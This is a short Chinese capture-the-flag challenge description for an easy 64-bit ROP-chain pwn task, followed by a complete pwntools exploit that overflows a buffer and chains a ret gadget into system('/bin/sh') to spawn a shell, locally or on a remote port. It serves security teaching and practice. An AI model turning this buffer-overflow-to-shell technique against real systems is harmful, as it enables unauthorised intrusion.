# ROP链

- 作者：pn1fg

- 参考：

- 难度：Easy

- 分类：Pwn

- 暴露端口：70

# 题目描述

最简单的ROP链

# 题目解析

- 源码：[pwn.c](build/pwn.c)

- 考点：64位ROP链

[exp.py](writeup/exp.py)

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

if args['REMOTE']:
    io = remote(IP,port)
else:
    io = process('./pwn')

elf = ELF("./pwn")
rop = ROP(elf)

rop.raw(cyclic(0x70 + 8))
rop.raw(rop.find_gadget(["ret"]))
rop.call(elf.sym["system"], [next(elf.search(b"/bin/sh"))])

payload = rop.chain()
io.sendlineafter(b'a?\n',payload)
io.interactive()
```


